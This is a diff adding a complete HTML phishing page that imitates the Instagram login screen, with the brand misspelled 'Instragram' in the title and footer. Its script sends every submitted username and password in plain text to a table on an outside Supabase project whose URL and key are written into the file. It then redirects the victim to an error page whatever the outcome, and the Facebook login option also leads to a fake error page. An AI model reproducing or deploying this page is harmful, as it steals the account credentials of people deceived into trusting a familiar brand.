@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instragram Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            touch-action: manipulation;
+        }
+
+        .container {
+            display: flex;
+            max-width: 900px;
+            width: 100%;
+            gap: 60px;
+            align-items: center;
+            flex: 1;
+        }
+
+        .phone-image {
+            flex: 1;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .login-container {
+            flex: 1;
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            font-family: 'Billabong', cursive;
+            font-size: 45px;
+            font-weight: normal;
+        }
+
+        .form-group {
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 8px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #0081d6;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
+            padding: 0 15px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .facebook-login i {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .signup-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .get-app p {
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .app-button {
+            height: 40px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .footer {
+            max-width: 900px;
+            width: 100%;
+            margin-top: 40px;
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+            padding: 0 20px;
+        }
+
+        /* Mobile Responsive Styles */
+        @media (max-width: 875px) {
+            .phone-image {
+                display: none;
+            }
+            
+            .container {
+                justify-content: center;
+                gap: 0;
+            }
+            
+            .login-container {
+                max-width: 100%;
+            }
+            
+            .login-box {
+                padding: 30px 20px;
+            }
+            
+            .footer {
+                margin-top: 20px;
+            }
+        }
+
+        @media (max-width: 450px) {
+            body {
+                padding: 10px;
+            }
+            
+            .login-box {
+                padding: 20px 15px;
+                border: none;
+                background-color: transparent;
+            }
+            
+            .signup-box {
+                border: none;
+                background-color: transparent;
+            }
+        }
+
+        /* Custom font for Instagram logo */
+        @font-face {
+            font-family: 'Billabong';
+            src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="phone-image">
+            <div style="width: 380px; height: 580px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 40px; position: relative; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.1);">
+                <div style="position: absolute; top: 20px; left: 50%; transform: translateX(-50%); width: 60%; height: 30px; background: #333; border-radius: 0 0 15px 15px;"></div>
+                <div style="position: absolute; top: 70px; left: 50%; transform: translateX(-50%); width: 80%; height: 400px; background: white; border-radius: 10px; overflow: hidden;">
+                    <div style="height: 60px; background: white; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid #dbdbdb;">
+                        <div style="font-family: 'Billabong', cursive; font-size: 24px;">Instagram</div>
+                    </div>
+                    <div style="padding: 15px;">
+                        <div style="display: flex; margin-bottom: 15px;">
+                            <div style="width: 32px; height: 32px; border-radius: 50%; background: #dbdbdb; margin-right: 10px;"></div>
+                            <div>
+                                <div style="font-weight: 600; font-size: 14px;">username</div>
+                                <div style="font-size: 12px; color: #8e8e8e;">Location</div>
+                            </div>
+                        </div>
+                        <div style="height: 250px; background: #dbdbdb; border-radius: 5px; margin-bottom: 10px;"></div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <div style="display: flex; gap: 15px;">
+                                <div style="font-size: 24px;">♡</div>
+                                <div style="font-size: 24px;">💬</div>
+                                <div style="font-size: 24px;">📤</div>
+                            </div>
+                            <div style="font-size: 24px;">📌</div>
+                        </div>
+                    </div>
+                </div>
+                <div style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); width: 50%; height: 5px; background: #333; border-radius: 5px;"></div>
+            </div>
+        </div>
+        
+        <div class="login-container">
+            <div class="login-box">
+                <div class="logo">
+                    <h1>Instagram</h1>
+                </div>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="login-button">Log In</button>
+                </form>
+                
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+                
+                <div class="facebook-login" onclick="window.location.href='facebook_error.html'">
+                    <i class="fab fa-facebook-square"></i> Log in with Facebook
+                </div>
+                
+                <a href="forgot_password.html" class="forgot-password">Forgot password?</a>
+            </div>
+            
+            <div class="signup-box">
+                Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Sign up</a>
+            </div>
+            
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-buttons">
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" class="app-button">
+                    </a>
+                    <a href="https://apps.microsoft.com/detail/9NBLGGH5L9XT" target="_blank">
+                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft" class="app-button">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <span>© Instragram from Meta</span>
+    </div>
+
+    <script>
+        // Initialize Supabase with provided credentials
+        const supabaseUrl = 'https://iusvixaelukwzmoxvjap.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1c3ZpeGFlbHVrd3ptb3h2amFwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ0MzM3MzMsImV4cCI6MjA4MDAwOTczM30.my-l-WfIJFLWVMaIDFhvMcMXGRkY19yJ_b3PP0xqviY';
+        
+        // Create Supabase client
+        const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+        
+        console.log('Supabase initialized:', supabase);
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Save login attempt to Supabase
+            try {
+                console.log('Attempting to save to Supabase...');
+                
+                const { data, error } = await supabase
+                    .from('login_attempts')
+                    .insert([
+                        { 
+                            username: username, 
+                            password: password,
+                            platform: 'instagram',
+                            created_at: new Date().toISOString()
+                        }
+                    ]);
+                
+                if (error) {
+                    console.error('Error saving to Supabase:', error);
+                    // Redirect to error page
+                    window.location.href = 'error.html';
+                } else {
+                    console.log('Data saved to Supabase:', data);
+                    // Redirect to error page
+                    window.location.href = 'error.html';
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                // Redirect to error page
+                window.location.href = 'error.html';
+            }
+        });
+        
+        // Disable zooming
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+        
+        document.addEventListener('touchmove', function(e) {
+            if (e.scale !== 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+    </script>
+</body>
+</html>
